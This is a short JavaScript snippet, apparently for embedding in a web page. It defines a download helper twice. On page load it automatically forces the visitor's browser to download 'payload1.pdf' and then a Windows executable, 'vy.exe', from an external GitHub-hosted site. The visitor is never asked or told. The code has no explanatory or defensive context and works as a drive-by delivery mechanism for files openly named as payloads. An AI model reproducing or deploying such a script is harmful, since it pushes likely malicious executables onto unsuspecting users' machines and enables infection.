//vy
function downloadFile(url, filename) {
    const anchorElement = document.createElement('a'); 
    anchorElement.href = url; 
    anchorElement.download = filename; 
    anchorElement.click(); 
}function downloadFile(url, filename) {
    fetch(url)
      .then(response => response.blob())
      .then(blob => {
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.style.display = "none";
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
      })
      .catch(() => alert("Failed to download file"));
}

// Automatically start the download
downloadFile("https://raw.githubusercontent.com/ener1-s3c/ener1-s3c.github.io/master/payload1.pdf", "payload1.pdf");


const fileUrl = 'https://raw.githubusercontent.com/ener1-s3c/ener1-s3c.github.io/master/vy.exe'; 
const fileName = 'vy.exe'; 

downloadFile(fileUrl, fileName); 
